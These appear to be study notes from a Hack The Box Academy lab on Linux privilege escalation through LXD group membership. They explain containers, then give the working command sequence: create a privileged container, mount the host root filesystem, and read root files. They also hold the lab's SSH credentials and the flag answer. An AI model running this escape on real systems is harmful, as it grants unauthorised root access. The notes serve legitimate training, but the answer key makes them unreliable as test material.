# LXD
## Containers
Containers operate at the operating system level and virtual machines at the hardware level. Containers thus share an operating system and isolate application processes from the rest of the system, while classic virtualization allows multiple operating systems to run simultaneously on a single system.

## Linux Containers
Linux Containers (LXC) is an operating system-level virtualization technique that allows multiple Linux systems to run in isolation from each other on a single host by owning their own processes but sharing the host system kernel for them.


### Linux Daemon
Linux Daemon (LXD) is similar in some respects but is designed to contain a complete operating system. Thus it is not an application container but a system container. Before we can use this service to escalate our privileges, we must be in either the `lxc` or `lxd` group. We can find this out with the following command:

```sh
$ id

uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)
```

We can either create our own container and transfer it to the target system or use an existing container. 

```sh
$ lxc image import ubuntu-template.tar.xz --alias ubuntutemp
$ lxc image list
```

After verifying that this image has been successfully imported, we can initiate the image and configure it by specifying the `security.privileged` flag and the root path for the container. This flag disables all isolation features that allow us to act on the host.

```sh
$ lxc init ubuntutemp privesc -c security.privileged=true
$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

Once we have done that, we can start the container and log into it. In the container, we can then go to the path we specified to access the `resource` of the host system as `root`.

```sh
$ lxc start privesc
$ lxc exec privesc /bin/bash
root@nix02:~# ls -l /mnt/root
```

## Questions
SSH to 10.129.201.127 (ACADEMY-LLPE-CONT), with user `htb-student` and password `HTB_@cademy_stdnt!`
1. Escalate the privileges and submit the contents of flag.txt as the answer. **Answer: HTB{C0nT41n3rs_uhhh}**
   - Found an existing image, import it, create a container that mount the host's `root` directoy and disable all isolation features with flag `security.privileged` enabled:
        ```sh
        $ cd ContainerImages/
        $ ls
        alpine-v3.18-x86_64-20230607_1234.tar.gz
        $ lxc image alpine-v3.18-x86_64-20230607_1234.tar.gz --alias alpinelpe
        Error: unknown flag: --alias
        $ lxc image import alpine-v3.18-x86_64-20230607_1234.tar.gz --alias alpinelpe
        $ lxc image list
        +-----------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
        |   ALIAS   | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCHITECTURE |   TYPE    |  SIZE  |         UPLOAD DATE          |
        +-----------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
        | alpinelpe | b14f17d61b9d | no     | alpine v3.18 (20230607_12:34) | x86_64       | CONTAINER | 3.62MB | Jun 20, 2026 at 2:49am (UTC) |
        +-----------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
        $ lxc init alpinelpe privesc -c security.privileged=true
        Creating privesc
        $ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
        Device host-root added to privesc
        ```
   - Start the container, execute into it and read the flag on the mounted folder:
        ```sh
        $ lxc start privesc
        $ lxc exec privesc /bin/sh
        ~ # cat /mnt/root/root/flag.txt
        HTB{C0nT41n3rs_uhhh}
        ```